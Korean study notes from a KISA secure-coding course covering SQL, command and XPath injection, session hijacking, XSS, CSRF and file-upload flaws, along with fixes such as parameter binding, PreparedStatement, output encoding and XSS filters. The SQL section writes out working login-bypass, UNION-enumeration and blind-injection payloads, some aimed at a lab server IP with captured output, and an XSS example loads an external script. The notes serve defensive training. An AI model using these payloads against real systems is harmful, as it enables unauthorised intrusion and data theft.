# 시큐어 코딩(KISA) Day - 2



### 1. Injection

---



#### 1. SQL Injection

---

- 철저한 외부 입력값에 대한 검증 작업이 수행되지 않다면 다양한 방법으로 공격이 올 수 있다. 안정성을 검증하는 작업을 수행한 뒤 응답하는 프로그램 작성을 요구 한다.


- 강사님 사이트 접속 

  ```html
  <!-- 
  문자열 '' and bPass= ''의 따옴표가 짝이 맞지 않습니다. 
  /login_ck.asp, 줄 8 

  이러한 메세지를 친절하게 보내준다. 
  select a,b,c from table1
  where id =''' and bPass = ''  이런 모양일 것이다.
  둘다 참으로 변경하면 where 조건이 없어질 것이다.  select all.

  where id =''or'a'='a' and bPass =''or'a'='a'
  에서 'or'a'='a 만 복사하여 접속 
  ```


    2. 게시판 게시물이 get형태로 접속한다면 
      http://110.10.79.10:9900/board_view.asp?num=1723
        http://110.10.79.10:9900/board_view.asp?num=1723 and db_name() = 1 --  // 이와 같이 한다면
        table 명을 출력하게 된다.


    3. openeg 사이트 테스트
   - ID : 'or'a'='a PW : 'or'a'='a
   - sprint framework and ibatis 에서 에러를 호출한다. 
   - Many results 라는 에러가 나온다. 즉, 많은 정보가 나와 에러다 
   - 회원가입을 통해서 아이디 체크를 하면 아이디를 알 수 있다.=> 이미 가입되어있다.
   - 아이디를 통해 PW는 동일하게.

  where id ='admin'#' and bPass='' or 'a'='a' #뒤는 Comment
   즉, id 에 admin'#

  아래와 같이 Binding 형태로 변경하면 처리가 될 것이다. 
  -->
  ```

  ```xml
  <select id="loginCheck1" parameterClass="String" resultClass="LoginModel">
  		select 
  			idx,
  			userId,
  			userPw,
  			userName,
  			joinDate
  		from board_member
  		where userId = #userId# <!--Binding-->
  	</select>	
  	<select id="loginCheck2" parameterClass="LoginModel" resultClass="LoginModel">
  		select 
  			idx,
  			userId,
  			userPw,
  			userName,
  			joinDate
  		from board_member
  		where userId = '$userId$' and userPw = '$userPw$' <!--그냥 변수로 할당.-->
          where userId = #userId# and userPw = #userPw#
  	</select>	
  ```

- UNION SQL 삽입.

  - admin' union select 1,2,3,4# 
  - 에러 발생 갯수를 맞출때까지 해본다. => admin' union select 1,2,3,4,5,6#
  - 갯수가 출력이 된다 

  ```html
  MySQL 조회결과:    IDX: 1      ID: admin      PASSWORD: openeg      이름: 관리자
  IDX: 1      ID: 2      PASSWORD: 3      이름: 4
  ```

  - DB 의 모든 이름을 주세요라는 공격

  ```html
  p.198 

  admin' union select schema_name,2,3,4,5,6 from information_schema.schemata#
  MySQL 조회결과:    IDX: 1      ID: admin      PASSWORD: openeg      이름: 관리자
  IDX: information_schema      ID: 2      PASSWORD: 3      이름: 4
  IDX: board      ID: 2      PASSWORD: 3      이름: 4
  IDX: dvwa      ID: 2      PASSWORD: 3      이름: 4
  IDX: hacmebooks      ID: 2      PASSWORD: 3      이름: 4
  IDX: mysql      ID: 2      PASSWORD: 3      이름: 4
  IDX: openeg      ID: 2      PASSWORD: 3      이름: 4
  IDX: owasp10      ID: 2      PASSWORD: 3      이름: 4
  IDX: phpmyadmin      ID: 2      PASSWORD: 3      이름: 4
  IDX: puzzlemalldb      ID: 2      PASSWORD: 3      이름: 4
  ```

- 게시판의 결과가 GET방식  Number 로 나올 경우 , Blind Sql injection 시간이 오래 걸린다.

  ```html
  http://110.10.79.10:9900/board_view.asp?num=1723 and substring(db_name(),1,1) = 'a' --
  뒤의 알파뱃을 변경해가면서 DB명을 테스트. b가 정답.
  ```

- 도구를 이용하면 쉽게 할 수 있다. 판고린, Pangolin

- PreparedStatement

```java
// p.212 정적 쿼리를 사용하는게 제일 좋은 방법이다.
PreparedStatement st = null;
con = EConnection.getConnection(this);	
st = con.prepareStatement("select * from board_member where userid=?");
st.setString(1, id); // 첫번째 id 1
rs = st.executeQuery();
```



#### 2. Command Injection(운영체제 명령어 삽입)

---

- Process를 통해 Userid, Groupid를 통해 Process를 folk하고 새롭게 만들어진 Process에서 내가 원하는 Command를 수행 할 수 있다.
- 허가할 명렁어 List를 작성하여 체크하는 것이 안전한 방법이다.



#### 3. XPATH Injection

---

- XML문서에서 특정 요소나 속성까지 도달하기 위한 경로를 요소의 계층을 토해 표현하는 것.
- 삽입을 발생할 수 있는 문자 () = '' [] :, * / 와 같은 문자를 필터링한 후 사용되도록 한다.





### 2. 세션 및 인증 관리 취약

---

- Session hijacking 
- firefox 의 tools -> Live HTTP headers 를 통해 Session ID를 가지고 올 수 있다.
- 해당 Session을 통해 Explorer의 Edit Cookie 에 붙여넣고 로그인하게 되면 자동 로그인하게 된다. 



##### 세션 관리 취약점

- 세션 ID 추측
  - 생성방법이 추절절한 경우 제 3자가 추측이 가능하여 세션 하이킹이 가능하다.
  - 웹서버 난수를 활용하여 만드는것이 좋다.
- 세션 ID 훔치기 
  - 네트워크 상에서 패킷 스니핑을 통해 ID를 훔쳐내거나, XSS취약점이 있는 곳에서 유출되거나, 세션 ID를 URL에 가지고있는 Redirect를 이용하거나, 브라우저의 취약점을 세션ID를 훔쳐내고 이를 이용.
  - IP와 세션을 크로스체크 -> IP보안을 보안을 걸어놓으면 Local에서는 공격이 가능하다.
- 세션 ID 고정
  - 로그인 전에 할당받은 세션 ID를 로그인 후에도 계속 사용하는 경우 공격자가 미리 알고 있는 세션 ID를 이용해서 사용자에게 로그인을 유도.
  - 공격자도 ID를 가지고 있기 때문에  사용자의 로그인 정보를 이용할 수 있게 된다.
- 세션관리 정책 미비
  - 유효기간이 잘관리 되지 않는 세션 ID의 경우, 로그아웃한 후에도 서버측에서 해당 세션 ID를 폐기하지않고 무한정 유요한 것으로 인정한다면 문제가 생긴다. 
  - Session.Timeout() -> 기본적으로 30분. 
  - 언제 어디서든 로그아웃 항목을 사용할 수 있도록 해야한다. 



##### 인증 관리

- 패스워드 설정/변경시 패스워드 문자열 정책이 적용되도록 한다. (시큐어코딩 항목이라기 보단 소프트웨어 보안 개발 관련된 정책이라고 할 수 있다.)
- 패스워드 규칙
  - 패스워드 설정 정책 : 8글자 이상 특수문자, 숫자 포함과 같은 규칙.
  - 추측 가능한 정보로 만들 수 없도록.
  - 직전 사용했던 패스워드 (히스토리 정책)
  - 주기적으로 변경 (6개월)
- 로그인 시도 횟수 제한. (5회)
- 패스워드 관리 정책
  - 암호화하여 DB에 저장, 복호화 할 수 없는 암호화를 통해(단방향)
  - hash를 사용하게 된다면 Salt를 사용해야한다 
    - Salt 란 ? 원본 메시지에 문자열을 추가하여 다이제스를 생성하는 것을 솔팅(salting)이라 한다.
    - https://howsecureismypassword.net/ 들어가서 나의 패스워드를 크랙하는데 걸리는 시간을 알려준다.
    - 충분히 입력값을 길게 만들어주면 오래걸린다.



### 3. XSS(크로스사이트 스크립트)

- Client를 공격하는 유일한 기법.

#### 3-1 Reflective XSS

- 서버에서 사용되는 외부 입력값 name이 안전한 값인지 검사하지 않고 사용되는 경우 XSS 취약점이 있는 처리 구조. 
- 사용자가 공격자가 공격하려는 Script를 출력되도록 만드는 구조.

```sequence
Client -> Server:http://a.com/ha.do?name="<script src='http://hack.js'></script>" 보
Server -> Client:"<script src='http://hack.js'></script>님 환영합니다." 출력
```

#### 3-2 Stored XSS

- DB에 저장해 해당 DB정보를 이용하는 App을 통해 시스템을 사용하는 모든 사용자들이 해당 스크립트를 수행 할 수 있도록 만든다.

```sequence
Client -> Server:http://a.com/ha.do/id=1
Server -> DB:id=1 Execute
DB -> Server:Qeury Response
Server -> Client: Directly Qeury Response
```



#### 3-3 DOM XSS

- AJax 프로그램에서 사용되는 자바스크립트를 이용해 브라우저에 수신된 데이터를 다시 잘라서 document write하는 작업을 수행하는 경우 XSS 공격이 가능.

```sequence
Client -> Server:1.http://a.com/ha.do
Server -> Client:2.hb.do로 리다이렉트 http://a.com/hb.do?message=<script>alert(123);</script>
Client -> Server:3.http://a.com/hb.do?message=<script>alert(123);</script>
Server -> Client:"요청이 처리됨 결과 전송"
```

- 5. 자바스크립트로 URL의 일부인 message 값을 잘라서 document.write로 DOM구조를 변경시킴.



#### 보안방법

- 나가는 방향에서 막는 것이 가장 좋은 방법인데 쉽지가 않다.
- 실제적으로 Script를 내보내는 코드가 있을 것이고 XSS 값으로 들어와서 나가는 값이 있을 것이다.
- 들어오는 값으로 공통 코드 처리를 하는 것인지 또는 나가는 것에 대해 할 것인지 
  - 나가는 것으로 하게 되면 모든 XSS가 처리 가능하다.
- 출력 
  - HTML 인코딩을 모두 거는 방법.(htmlEncode)
  - XSSFilter 
    - white list 정책 : 허용 리스트를 만들겠다 => 더욱 안전하다.
      - VIew-page : lucy-xss-filter 네이버 개발자 게시판에서 다운 가능.
    - black list 정책 : 특정 코드 빼고 다 허용
  - 신규 프로젝트에서는 OK. 하지만 기존의 시스템에서는 안된다. 
  - 들어오는 입력 값에서 Filter를 적용.

```java
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<td colspan="4" align="left"><p><c:out value = "${board.content}"/></p><br /><br /></td> //문자열로 전부 전환하여 출력.
```

```java
<%@ taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions" %>
<td colspan="4" align="left"><p>${fn:escapeXml(board.content)}</p><br /><br /></td> // htmlEncode를 걸어서 출력.
```

```java
// XSS Filter
// lucy
// library 와 xml을 import 하고 
String data=request.getParameter("data");
XssFilter filter = XssFilter.getInstance("lucy-xss-superset.xml");
buffer.append(filter.doFilter(data)); // 적용.


// href 가 허용이 된다 제공된 걸로 사용하면
<attribute name="href">
			<notAllowedPattern><![CDATA[(?i:s\\*c\\*r\\*i\\*p\\*t)]]></notAllowedPattern>
			<notAllowedPattern><![CDATA[&[#\\%x]+[\da-fA-F][\da-fA-F]+]]></notAllowedPattern>
		</attribute>
		
 // 를 xml에 추가 하면 href도 막아진다.
```



- 입력
  - XSSFilter 공통으로 모든 입력값에 대해서 적용.
  - Black-list 정책으로 적용 (실습) 
  - White-list를 하려면  lucy-xss-filter를 이용해서 사용하면 됨.
  - http://openeg.co.kr/383 에서 파일 복사 
    - web.xml
    - XSSFilter.java
    - XSSRequestWrapper.java
  - java resouce 에 src 안에 comm.filter 라는 빈 Package안에 복붙.
    - XSSFilter.java
    - XSSRequestWrapper.java

```xml
<!--web.xml -->
<filter> <!-- 모든 url에 request를 타면 모두 적용하겠다. -->
    <filter-name>xssFilter</filter-name>
    <filter-class>kr.co.openeg.lab.common.filter.XSSFilter</filter-class>
  </filter>
  
  <filter-mapping>
    <filter-name>xssFilter</filter-name>
    <url-pattern>/*</url-pattern>
  </filter-mapping>
```





### 4. CSRF (크로스사이트 요청 위조)

---

- 서버가 클라이언트의 요청이 인증받은 사용자의 인가된 실제 요청인지 구분하지 않고 요청을 처리하는 경우 발생한다.
- a.do -> b.do -> c.do 순으로 수행이 된다고 할때, c.do를 수행하기 위해 b.do의 정보를 header에 referer 헤더값에 넣어서 하면 되는데 이 또한 위변조가 가능하여 위험하다.
- CAPTCHA를 이용하여 요청의 유혀성을 확인하는 작업이 필요하다. 
  - 구글에서 CAPTCHA Crack Library 가 존재한다. 검색하면 나옴.
  - 이미지에 휘갈기는 형태의 이미지로 CAPTCHA로 변환
  - 사진을 9개 보여주고 잔디밭을 골라라 하는 등의 형태로 변환.
- 너무 중요한 기능이라면 추가 인증이 필요하다.
- 예) HTML submit 기능을 수행하도록 코드를 게시판에 올려놓으면 누군가 클릭을 하게 되면 그 코드가 자동적으로 수행되도록 서버에 요청을 보낸다.





### 5. 파일업로드 다운로드

----

- 파일 업로드 : 아무거나 올라가면 취약
- 파일 다운로드 : 아무거나 다운로드 가능하면 취약